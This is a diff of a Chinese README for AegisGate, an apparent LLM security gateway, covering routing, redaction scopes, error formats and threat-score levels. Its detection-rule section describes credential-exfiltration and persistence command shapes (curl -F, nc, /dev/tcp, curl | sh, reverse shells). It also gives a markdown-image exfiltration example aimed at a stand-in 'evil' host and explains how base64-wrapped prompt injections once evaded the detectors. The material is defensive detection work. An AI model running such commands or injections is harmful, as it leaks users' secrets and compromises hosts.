@@ -59,89 +59,22 @@ AegisGate 是独立的安全代理层，**不管理也不约束上游服务**。
 
 > 请先按上游官方文档完成安装和配置，确认上游本身可用后再接入网关。
 
-### 场景一：同机部署（网关与上游在同一台服务器）
+### 三种接入场景
 
-同机部署下，AegisGate 支持两种路由方式：
+完整步骤（含 Docker 服务名、网络连通性排查、Caddy 要点）见 [UPSTREAM-QUICKSTART.md](UPSTREAM-QUICKSTART.md)。这里只留判断依据：
 
-- **主机端口路由**：纯数字 token（如 `/v1/__gw__/t/8317/...`）在 `AEGIS_ENABLE_LOCAL_PORT_ROUTING=true` 时回退到 `http://<本地端口路由主机>:8317/v1`。仓库自带 Docker Compose 默认开启；裸机部署需显式开启。
-- **Docker 服务映射**：当设置 `AEGIS_DOCKER_UPSTREAMS` 时，启动时会自动注入 `8317 -> http://cli-proxy-api:8317/v1` 这类 token 映射；**同名映射优先级高于数字端口回退**。
+| 场景 | 适用条件 | 做法 |
+| --- | --- | --- |
+| **同机部署** | 网关与上游在同一台机器 | 客户端 Base URL 直接用 `/v1/__gw__/t/<端口号>`，无需注册 token。需 `AEGIS_ENABLE_LOCAL_PORT_ROUTING=true`；上游在 Docker 里时改用 `AEGIS_DOCKER_UPSTREAMS` 的服务名映射 |
+| **远程上游** | 上游不在本机 | 端口路由不可用，用 `POST /__gw__/register` 注册 token 绑定远程地址，或直接编辑 `config/gw_tokens.json`（热重载，无需重启） |
+| **公网暴露** | 需要域名 + TLS | 前置 Caddy 做 TLS 终结，见 [Caddyfile.example](Caddyfile.example)。`flush_interval -1` 必须设置，否则 SSE 会被缓冲 |
 
-主机端口路由形态：
+两条贯穿三个场景的安全默认：
 
-```
-客户端 → http://<网关IP>:18080/v1/__gw__/t/{端口号}/... → localhost:{端口号}/v1/...
-```
+- 纯数字端口 token（1024–65535，如 `8317`）默认按**仅内网**处理。对公网暴露请注册随机 token（推荐）、启用请求 HMAC，或显式设置 `AEGIS_ALLOW_PUBLIC_NUMERIC_TOKENS=true`。
+- `token__passthrough` 会禁用全部过滤器，同样默认**仅内网**；如需放开设 `AEGIS_ALLOW_PUBLIC_PASSTHROUGH_MODE=true`（危险）。
 
-
-| 上游             | 客户端 Base URL                             |
-| -------------- | ---------------------------------------- |
-| CLIProxyAPI    | `http://<网关IP>:18080/v1/__gw__/t/8317`   |
-| Sub2API        | `http://<网关IP>:18080/v1/__gw__/t/8080`   |
-| AIClient-2-API | `http://<网关IP>:18080/v1/__gw__/t/3000`   |
-| 自建 OpenAI 兼容   | `http://<网关IP>:18080/v1/__gw__/t/{你的端口}` |
-
-
-- 客户端的 `Authorization: Bearer <key>` 直接透传到上游
-- 多个上游可同时使用，互不冲突
-- **无需注册 token、无需编辑配置、无需重启网关**
-- 支持过滤模式后缀：`token__redact`（仅脱敏）或 `token__passthrough`（直接穿透），详见 [§ 2.3 过滤模式](#23-过滤模式token__redact--token__passthrough)
-- **安全默认**：纯数字端口 token（1024–65535，例如 `/v1/__gw__/t/8317/...`）默认按**仅内网**处理。对公网暴露时建议注册随机 token（推荐）或启用请求 HMAC；如需强行放开可设置 `AEGIS_ALLOW_PUBLIC_NUMERIC_TOKENS=true`。
-- **安全默认**：`token__passthrough` 会禁用全部过滤器，默认按**仅内网**处理；如需对公网放开可设置 `AEGIS_ALLOW_PUBLIC_PASSTHROUGH_MODE=true`（危险）。
-
-Docker 相关说明：
-
-- 主机端口路由通过 `host.docker.internal:{端口}` 访问宿主机端口，因此**上游端口必须映射到宿主机**；裸机部署时可改为 `AEGIS_LOCAL_PORT_ROUTING_HOST=127.0.0.1`。
-- 仓库自带 compose 默认注入 `AEGIS_DOCKER_UPSTREAMS=8317:cli-proxy-api,8080:sub2api,3000:aiclient2api`。
-- 这些 Docker 服务映射只有在 AegisGate 容器能解析并访问对应服务名时才生效。
-- 仓库自带 compose 默认只附加 CLIProxyAPI 和 Sub2API 的外部网络；`3000:aiclient2api` 若要走 Docker 服务映射，你需要自行补齐网络连通性，否则应移除该映射或改用主机端口路由。
-
-### 场景二：远程上游（网关与上游不在同一台服务器）
-
-上游在远程时，端口路由不可用，需通过 `/__gw__/register` 注册 token 绑定远程地址：
-
-```bash
-# gateway_key 的值即 config/aegis_gateway.key 文件内容（cat config/aegis_gateway.key 查看）
-curl -X POST http://127.0.0.1:18080/__gw__/register \
-  -H "Content-Type: application/json" \
-  -d '{"upstream_base":"https://远程上游地址/v1","gateway_key":"<YOUR_GATEWAY_KEY>"}'
-```
-
-返回 token 后，客户端使用：`http://<网关IP>:18080/v1/__gw__/t/<返回的token>`
-
-也可以直接编辑 `config/gw_tokens.json`（参考 `config/gw_tokens.json.example`）：
-
-```json
-{
-  "tokens": {
-    "remote-claude": {
-      "upstream_base": "https://远程上游地址/v1",
-      "whitelist_key": []
-    }
-  }
-}
-```
-
-重启网关后生效。命名 token 优先级高于端口自动路由。
-
-### 场景三：Caddy + 网关对公网暴露
-
-通过域名 + TLS 对外提供服务时，Caddy 在网关前面做 TLS 终结，请求仍走网关端口路由到上游：
-
-```
-客户端 → https://api.example.com/v1/__gw__/t/<token>/... → Caddy → AegisGate:18080 → localhost:8317
-```
-
-对公网暴露时建议使用随机注册 token；纯数字端口 token 与 `__passthrough` 默认会被公网/非内网客户端拒绝。
-
-完整 Caddyfile 示例见 [Caddyfile.example](Caddyfile.example)。
-
-要点：
-
-- `flush_interval -1`：SSE 流式不缓冲，**必须设置**
-- `response_header_timeout 660s`：长时间推理不超时
-- `/__gw__/`* 返回 403：管理接口不暴露到公网
-- 管理后台建议单独域名直连上游，不经网关
-- Caddy 只做 TLS + 转发，路由逻辑全在网关内部
+过滤模式后缀（`__redact` / `__passthrough`）见 [§ 2.3 过滤模式](#23-过滤模式token__redact--token__passthrough)；token 注册的完整参数见 [§ 2.1 Token 注册](#21-token-注册多上游多租户推荐)。
 
 ## Agent Skill
 
@@ -234,8 +167,27 @@ curl -X POST http://127.0.0.1:18080/__gw__/register \
 
 具体启用哪些规则由路由决定，且打分流水线与转发路径使用同一判据（`is_low_false_positive_route`）：
 `/v1/chat/completions`、`/v1/responses`、`/v1/messages` 的请求体是结构化会话内容，误报会破坏提示词，
-因此只跑**低误报 id 集**（`redaction.relaxed_pii_ids`，默认仅凭据类）；其余路由（含通用代理）跑完整规则集。
+因此只跑**低误报 id 集**（`redaction.relaxed_pii_ids`，默认仅凭据类 13 项）；其余 `/v1/` 路由（含通用代理）跑完整 56 项。
 如需在这三条路由上也跑全量规则，可配置 `redaction.relaxed_pii_ids: ["*"]`。
+
+完整口径是**六个执行面**而非两桶——打分那一遍和真正改写外发内容那一遍用的集合并不总是同一套：
+
+| 执行面 | 范围 | 使用的集合 |
+| --- | --- | --- |
+| 管道层 · 对话路由 | `/v1/chat/completions`、`/v1/responses`、`/v1/messages` | relaxed（可配） |
+| 管道层 · 其他路由 | 含 multipart、通用 JSON | 全量 |
+| 转发层 · 对话消息 / `system` / `instructions` / 工具定义 | 同上三条路由 | relaxed（可配） |
+| 转发层 · multipart 表单字段 | `/v1/files`、`/v1/images/*` | 全量 |
+| 转发层 · 通用 `/v1/<子路径>` JSON | embeddings、rerank 等 | 全量 |
+| v2 请求体 | `/v2/__gw__/t/<token>/...` | relaxed（可配，与对话路由同一套） |
+
+两点需要在评估暴露面时特别注意：
+
+- 每个执行面都**按路由**决定用哪套集合，打分与改写用同一条判据，因此两层不会分歧。此前转发层是按消息**角色**推导的，而所有真实角色都在"relaxed 角色集"里——等价于"永远 relaxed"，与路由无关。
+- `field_value_patterns` 是**另一层**，V1 管道层与 V2 恒跑；但 V1 **转发层**会把它和 PII 规则合并后一起过 relaxed 集，默认集不含这两个 ID，因此在转发层默认不生效。这处不对称记录在 [ROADMAP.md](ROADMAP.md) R8 第 3 条。
+- multipart 的**文件内容**在任何执行面上都不参与请求侧脱敏，只有同请求里的表单字段参与。
+
+控制台会按规则逐条渲染这六个执行面（服务端计算后下发），见 [WEBUI-QUICKSTART.md](WEBUI-QUICKSTART.md) §4.3。
 
 `responses` 结构化输入补充说明（当前）：
 
@@ -302,7 +254,9 @@ curl -X POST http://127.0.0.1:18080/__gw__/register \
 
 ### 1.6 错误响应格式
 
-当前实现**并不是所有路由都返回同一种 JSON 错误包裹**，主要分为两类：
+当前实现**并不是所有路由都返回同一种 JSON 错误包裹**，分为三类。
+
+第一类，token 解析类错误（扁平结构）：
 
 ```json
 {
@@ -310,6 +264,8 @@ curl -X POST http://127.0.0.1:18080/__gw__/register \
   "detail": "token invalid or expired"
 }
 ```
+
+第二类，管道内产生的错误（带 `request_id`）：
 
 ```json
 {
@@ -325,7 +281,22 @@ curl -X POST http://127.0.0.1:18080/__gw__/register \
 }
 ```
 
-调用方应优先以 HTTP 状态码以及稳定的错误码字段（`error`、`error.code`、`error_code`）为准，而不是假设所有端点都返回同一种固定 schema。
+第三类，安全边界与管理接口的拒绝（`aegisgate/core/gateway_auth.py::_blocked_response`）。包裹形状与第二类相同，但**没有** `request_id`——请求还没进到分配 request_id 的那一层就被挡下了——且 `aegisgate` 块固定：
+
+```json
+{
+  "error": {
+    "message": "<人类可读原因>",
+    "type": "aegisgate_error",
+    "code": "<error_code>"
+  },
+  "error_code": "<error_code>",
+  "detail": "<人类可读原因>",
+  "aegisgate": { "action": "block", "risk_score": 1.0, "reasons": ["<error_code>"] }
+}
+```
+
+调用方应优先以 HTTP 状态码以及稳定的错误码字段（`error`、`error.code`、`error_code`）为准，而不是假设所有端点都返回同一种固定 schema；特别是**不要把 `request_id` 当成必有字段**。
 
 常见错误码：
 
@@ -356,11 +327,21 @@ curl -X POST http://127.0.0.1:18080/__gw__/register \
 补充：
 
 - `privilege_guard` 与 `request_sanitizer` 对研究/教学/引用类上下文有降权处理，避免安全分析类内容被过度拦截。
+- **解码结果回流**：多级解码（base64 / hex / URL）出来的文本不再只匹配 `decoded_keywords` 那九条关键词，而是重跑 `direct_patterns` / `system_exfil_patterns` / `tool_call_injection_patterns` 三个指令族，命中记为 `decoded:<规则 ID>`，落进它作为明文时会落进的同一个信号桶。此前把一条注入用 base64 包一层，就能从刚刚扫过外层文本的每一个规则族旁边走过去。`html_markdown` / `remote_content` / `spam_noise` 这类描述**书写形式**的规则族刻意不回流——解码之后它们说明不了什么。
 - `tool_call_guard` 若要切换到严格白名单模式，可在 `security_filters.yaml` 中显式配置 `tool_whitelist` 与 `action_map.tool_call_guard.disallowed_tool=block`。
+- **外泄链路规则（`exfil_chain_*`）**：判定的是「采集 + 出口」两种能力在同一条命令里同时成立——凭据文件/凭据目录/浏览器密钥库/整环境导出，与 `curl -F`、`-T`、`--data-binary @`、管道进 `nc`、`Invoke-RestMethod -Method Post` 之类的外发动作。单独出现任意一侧都是日常开发动作，**不入库**；只有成对出现才判定。三条边界是刻意的：凭据文件必须带点前缀（`.env`，而不是 URL 里的 `/env` 路径段），`.env.example` 一类模板排除在外；`scp` / `rsync` 不在覆盖范围内——它们的 `-F`/`-T` 是「ssh config」「临时目录」而非「上传」；收割类规则要求出现真实的密钥关键字，而不只是一个看起来像递归的选项。分布在三处，各自的处置不同：
+  - `tool_call_guard.dangerous_param_patterns`（6 条）：作用于工具调用参数，按 `review` 抬分并标记复核；同时经 `router::_tool_call_guard_patterns` 参与自动遮挡时的工具调用剥离。
+  - `sanitizer.command_patterns`（5 条）：作用于响应正文，命中即 `response_disposition=sanitize`。少的那条是 `exfil_chain_secret_in_url_query`——正文里的一个文档示例 URL 不该让流式回答被截断。
+  - `sanitizer.force_block_command_patterns`（2 条）：最高置信的两种形态，由 `AEGIS_STRICT_COMMAND_BLOCK_ENABLED`（默认 `false`）把关。
+- **持久化规则（`exfil_persist_*`）**：判定「自启动面 + 拉取远程代码并执行」同时成立——`crontab` / `/etc/systemd/system` / LaunchAgents / `HKCU\...\Run` / `.bashrc` / `.zshrc` 等，配上 `curl … | sh`、`/dev/tcp/`、`Invoke-Expression` 之类的载荷。写 `.bashrc` 是日常配置、装个 cron 是日常部署，**单侧一律不判**；两者成对才没有善意解释。另有一条针对 agent 改写自身配置（MCP server 定义、`settings.json`、`CLAUDE.md`、skill 文件）后接网络命令的情形。这三条不在 `_PATH_REFERENCE_PATTERN_IDS` 里，因此对写文件类工具同样生效——攻击本身就是那次写入。
+- **markdown 图片外带（`exfil_egress_markdown_image_secret`）**：`![](https://evil/?d=KEY)` 渲染即发出请求，不需要点击。规则**要求 query 里带密钥形态或 AegisGate 占位符**——不带密钥的普通 markdown 图片就只是一张图，既有的 `<img>` 规则也正是为此刻意不设动作。它同时登记在 `injection_detector.html_markdown_patterns`（只计分）与 `sanitizer.unsafe_markup_patterns`（真正移除）。后者是执行点：`OutputSanitizer` 是响应侧最后一个过滤器，跑在还原之后，看到的是占位符背后的真实凭据。
+- **还原侧的位置判据**：`restoration.suspicious_context_patterns` 原本只问「措辞可不可疑」，不命中就无条件把占位符还原成真实值写回正文——措辞是可以改写的。新增三条**按位置**判定：占位符出现在 URL query 值、网络命令的参数位、markdown 图片 URL 里。这些位置正是数据离开本机的地方，换个说法绕不过去。
+- `tool_call_guard` 的**只读工具豁免已收窄**：`read` / `read_file` / `glob` / `grep`（采集面）与 `webfetch` / `web_fetch` / `web_search` / `browser` / `search`（出口面）不再整类跳过 `dangerous_param_patterns`——它们恰是外泄链的两端。命中走**独立的 action key** `readonly_param`，默认 `observe`：**只记录，不抬分、不设 `requires_human_review`**。这一条是必须的：`review` 会设 `requires_human_review`，非流式下 `_needs_confirmation` 据此走自动遮挡，整个工具调用被替换为占位符——而 `read ~/.ssh/config`、`grep -r /etc/passwd` 是日常运维动作。`todowrite` / `task` / `submit` / `notebook_edit` 既不读文件也不上网，仍整类豁免。两端检查的模式集不同：采集侧过全量 `dangerous_param_patterns`，出口侧跳过 `sensitive_file_access` / `path_traversal` / `ssh_key_access`——它们只上网、不碰文件系统，一条「怎么读 /etc/passwd」的搜索是关于文件读的问题，不是一次文件读。
+- `request_sanitizer` 命中 `secret_exfiltration` / `privilege_escalation` / `rule_bypass` 时，`review` 档会把风险分抬到 0.6 并打 `request_*` 标签（与 `leak_check` 一致），**不拦截**。此前该分支只有 `block` 会做事，而这三类默认都配成 `review`，等于纯日志。
 
 **分级变形策略**：
 
-- **极度危险指令**（`rm -rf`、SQL 注入、反弹 shell、fork bomb、`curl|bash`、`dd if=of=`、`mkfs`、`powershell -enc` 等）：片段被完全替换为 `【AegisGate已处理危险疑似片段】`，**原文不会出现在返回中**。该模式集由代码在启动时合成（`router.py::_critical_danger_patterns`），来源为 `anomaly_detector.command_patterns` 中的 8 类严重规则、`sanitizer.force_block_command_patterns`、`privilege_guard.blocked_patterns` 与 13 条硬编码 shell 模式；具体条数随 `security_filters.yaml` 变动。
+- **极度危险指令**（`rm -rf`、SQL 注入、反弹 shell、fork bomb、`curl|bash`、`dd if=of=`、`mkfs`、`powershell -enc` 等）：片段被完全替换为 `【AegisGate已处理危险疑似片段】`，**原文不会出现在返回中**。该模式集由代码在启动时合成（`router.py::_critical_danger_patterns`），来源为 `anomaly_detector.command_patterns` 中的 8 类严重规则、`sanitizer.force_block_command_patterns`（含两条 `exfil_chain_*`，**这条来源不受 `AEGIS_STRICT_COMMAND_BLOCK_ENABLED` 把关**）、`privilege_guard.blocked_patterns` 与 13 条硬编码 shell 模式；具体条数随 `security_filters.yaml` 变动。
 - **一般危险片段**（系统提示词泄露、可疑权限操作等）：使用 chunked-hyphen 分词变形（如 `dev-elo-per mes-sag-e`）。
 
 建议：
@@ -385,7 +366,7 @@ curl -X POST http://127.0.0.1:18080/__gw__/register \
 ```bash
 curl -X POST http://127.0.0.1:18080/v1/responses \
   -H "Content-Type: application/json" \
-  -d '{"model":"gpt-4.1-mini","input":"hello"}'
+  -d '{"model":"gpt-5.4-mini","input":"hello"}'
 ```
 
 建议：
@@ -431,7 +412,7 @@ curl -X POST http://127.0.0.1:18080/__gw__/register \
 ```bash
 curl -X POST http://127.0.0.1:18080/v1/__gw__/t/ExampleToken24CharsAbc12/responses \
   -H "Content-Type: application/json" \
-  -d '{"model":"gpt-4.1-mini","input":"hello"}'
+  -d '{"model":"gpt-5.4-mini","input":"hello"}'
 ```
 
 v2 请求示例（原始目标放请求头）：
@@ -562,12 +543,12 @@ curl http://gateway:18080/v1/__gw__/t/8317__passthrough/chat/completions ...
 # 非流式
 curl -X POST 'http://127.0.0.1:18080/v1/__gw__/t/<TOKEN>/messages' \
   -H 'Content-Type: application/json' \
-  -d '{"model":"claude-3-5-sonnet-latest","max_tokens":128,"messages":[{"role":"user","content":"hello"}]}'
+  -d '{"model":"claude-sonnet-4-6","max_tokens":128,"messages":[{"role":"user","content":"hello"}]}'
 
 # 流式
 curl -N -X POST 'http://127.0.0.1:18080/v1/__gw__/t/<TOKEN>/messages' \
   -H 'Content-Type: application/json' \
-  -d '{"model":"claude-3-5-sonnet-latest","stream":true,"max_tokens":128,"messages":[{"role":"user","content":"hi"}]}'
+  -d '{"model":"claude-sonnet-4-6","stream":true,"max_tokens":128,"messages":[{"role":"user","content":"hi"}]}'
 ```
 
 更多终端/客户端（Codex CLI、Cherry、VS Code、Cursor、WSL2）接入见：
@@ -639,11 +620,19 @@ curl http://127.0.0.1:18080/health
 curl http://127.0.0.1:18080/ready
 ```
 
-响应体里有 `checks` 映射和 `degraded_checks` 列表。其中一项**只上报、不影响就绪判定**：
-规则文件在磁盘上解析不了时，`security_rules` 会显示 `stale: <错误>`。此时网关仍在执行
-最后一次成功加载的那份规则，因此依然可以服务；而所有副本读的是同一个文件，在这里让就绪
-失败会把它们同时摘掉，把一个配置笔误变成一次故障。**请对 `degraded_checks` 告警，而不是
-只看状态码。**
+响应体里有 `checks` 映射和 `degraded_checks` 列表。其中两项**只上报、不影响就绪判定**：
+
+- 规则文件在磁盘上解析不了时，`security_rules` 会显示 `stale: <错误>`。此时网关仍在执行
+  最后一次成功加载的那份规则，因此依然可以服务；而所有副本读的是同一个文件，在这里让就绪
+  失败会把它们同时摘掉，把一个配置笔误变成一次故障。
+- 有效风险阈值被 clamp 到高于 `action_map` 能给出的任何分数时，`risk_gate` 会显示
+  `unreachable: security_level=… effective_threshold=…`。此时所有「只抬 risk、不设
+  disposition」的 `block` 条目都是空转。在 `AEGIS_SECURITY_LEVEL=low` 下这就是该档位的
+  定义，不是故障，所以不参与就绪判定；上报是因为**另一条到达同一状态的路径是回归**——
+  而在此之前这个条件在任何地方都没有出口。直接设 `disposition` 的过滤器不受影响，这正是
+  这类失效只坏一半、很难被发现的原因。
+
+**请对 `degraded_checks` 告警，而不是只看状态码。**
 
 UI 检查：
 
@@ -690,8 +679,13 @@ ports:
 expose:
   - "28080"                     # ② 容器间暴露
 environment:
-  AEGIS_PORT: "28080"           # ③ 网关监听端口
+  AEGIS_PORT: "28080"           # ③ 网关监听端口，同时决定控制台渲染的客户端 Base URL
 ```
+
+镜像的启动命令读 `AEGIS_PORT`（缺省 `18080`），所以改这三处即可，不需要动 Dockerfile。
+`Dockerfile` 里的 `EXPOSE 18080` 只是声明性的，不发布端口、也不跟随 `AEGIS_PORT`。
+
+`AEGIS_HOST` **不参与容器内的监听地址**：镜像固定绑 `0.0.0.0`，容器的网络边界是上面的端口映射而不是监听地址。裸机部署时才由 uvicorn 的 `--host` 或 launcher 决定。
 
 上游服务也在 Docker 运行时，端口自动路由通过 `host.docker.internal` 访问宿主机端口。上游容器需要两项配置才能让网关到达：
 
@@ -835,23 +829,28 @@ AEGIS_DOCKER_UPSTREAMS=8317:cli-proxy-api,8080:sub2api,3000:aiclient2api
 | 级别               | 定位           | 行为                                            |
 | ---------------- | ------------ | --------------------------------------------- |
 | `high`           | 全量检测，宁可误拦不放过 | 阈值缩小（×0.90），地板抬高（×1.05），更容易触发拦截               |
-| `**medium`（默认）** | 宽松，仅高危 + 脱敏  | 阈值放大（×1.30），地板降低（×0.85），大部分"可能危险"指令不拦截        |
+| **`medium`（默认）** | 中性档，按策略声明值 | 阈值**不缩放**（×1.00），地板降低（×0.85）                       |
 | `low`            | 极宽松，基本只脱敏    | 阈值放大（×1.60），地板大幅降低（×0.70），几乎不触发 risk-based 拦截 |
 
 
-**缩放后的阈值会被 clamp 到 `1.0`**。因此在仓库自带的 `default` 策略下，`medium` 与 `low` 的有效阈值都是 `1.0`：
+`medium` 是**中性档**：直接用策略 YAML 声明的 `risk_threshold`，另外两档围绕它调整。
+缩放后的阈值会被 clamp 到 `1.0`：
 
-| 级别 | `default`（0.85） | `strict`（0.50） |
-| --- | --- | --- |
-| `high` | 0.765 | 0.45 |
-| `medium`（默认） | **1.0** | 0.65 |
-| `low` | **1.0** | 0.80 |
+| 级别 | `default`（0.85） | `strict`（0.50） | `permissive`（0.85） |
+| --- | --- | --- | --- |
+| `high` | 0.765 | 0.45 | 0.765 |
+| `medium`（默认） | **0.85** | 0.50 | **0.85** |
+| `low` | **1.0**（clamp） | 0.80 | **1.0**（clamp） |
 
-`action_map` 的 `block` 最高把风险分抬到 `0.95`，所以 `medium` / `low` + `default` 策略下，
-`OutputSanitizer` 里**基于分数**的拦截分支不会触发。这两档的防护来自不依赖阈值的硬处置路径
-（见下），以及 `AEGIS_STRICT_COMMAND_BLOCK_ENABLED`。需要基于分数的拦截请用 `high`，
-或改用 `risk_threshold` 更低的策略 YAML（`strict` 为 0.50）。
-`medium` 是否应该参与缩放属于未决问题，记录在 [ROADMAP.md](ROADMAP.md)。
+`action_map` 的 `block` 最高把风险分抬到 `0.95`。因此：
+
+- **`medium` / `high`**：`block` 能够达到阈值，`OutputSanitizer` 与 `RestorationFilter` 里
+  **基于分数**的拦截分支会真正触发——与控制台一直呈现的语义一致。
+- **`low` + `default`/`permissive`**：阈值 clamp 到 1.0，基于分数的拦截不触发。这一档的防护来自
+  不依赖阈值的硬处置路径（见下）与 `AEGIS_STRICT_COMMAND_BLOCK_ENABLED`。这符合"极宽松、基本只脱敏"的定位。
+
+`medium` 此前是 ×1.30，在三个自带策略上都 clamp 到 1.0，导致 `medium` 与 `low` 完全等价、
+且基于分数的拦截永不触发。前后对比见 [CHANGELOG.md](CHANGELOG.md)。
 
 **不依赖阈值的硬处置**：`injection_detector` 与 `rag_poison_guard` 的 `block` 会直接设置
 `request_disposition` / `response_disposition`，任何级别下都强制拦截：
@@ -863,8 +862,10 @@ AEGIS_DOCKER_UPSTREAMS=8317:cli-proxy-api,8080:sub2api,3000:aiclient2api
 
 > **注意 `block` 语义并不统一**：`restoration`（`exfiltration` / `too_many_placeholders` /
 > `stale_mapping`）与 `sanitizer`（`system_leak`）配的 `block` **只把风险分抬到 0.95**，不设置
-> disposition，因此仍然受上表的阈值约束——在 `medium` / `low` + `default` 策略下不会真正拦截。
-> 控制台「动作映射」页把这四种动作呈现为统一语义，与此处的实现差异一并记录在 [ROADMAP.md](ROADMAP.md)。
+> disposition，因此仍然受上表的阈值约束——在 `medium` / `high` 下会真正拦截，在
+> `low` + `default`/`permissive` 下不会。这与 `injection_detector` / `rag_poison_guard` 的
+> `block`（任何档位都强制拦截）仍有差别，控制台「动作映射」页把两者呈现为统一语义，
+> 该表述差异记录在 [ROADMAP.md](ROADMAP.md) R6 第 2 条。
 
 > 如果你的场景确实需要放宽 `tool_call_injection`（例如上游会正常回传工具调用的文本表示），可在 `security_filters.yaml` 中把 `action_map.injection_detector.tool_call_injection` 改为 `review`，并把它从 `non_reducible_categories` 中移除。默认保持强拦截。
 
@@ -944,11 +945,12 @@ pytest -q
 - `upstream_eof_no_done`：上游流式连接提前关闭，未按协议发送 `data: [DONE]`。网关会自动恢复并补发终止信号。
 - `terminal_event_no_done_recovered:response.completed|response.failed|error`：网关已经收到了上游明确的终止事件，但上游在发送 `[DONE]` 前就关闭了连接。这类情况不再记成泛化的 EOF 恢复。
 
-自动恢复行为：
+自动恢复行为**按路由不同**，只有以下三条链路会补终止信号：
 
 - `chat/completions`：合成包含恢复提示的可见文本 chunk。
 - `responses`：补发 `[DONE]`；若没有显式终止事件，必要时合成 `response.completed` 终止事件。
 - `v2`（SSE 流）：自动补发 `data: [DONE]\n\n`，保证客户端收到终止信号。
+- **`/v1/messages` 与通用 `/v1/<子路径>` 没有这个分支**：上游在哪里断，客户端就在哪里看到流截断。补上属于**新增行为**而非缺陷修复，需要单独评估客户端兼容性，记录在 [ROADMAP.md](ROADMAP.md)。
 
 排查建议：
 
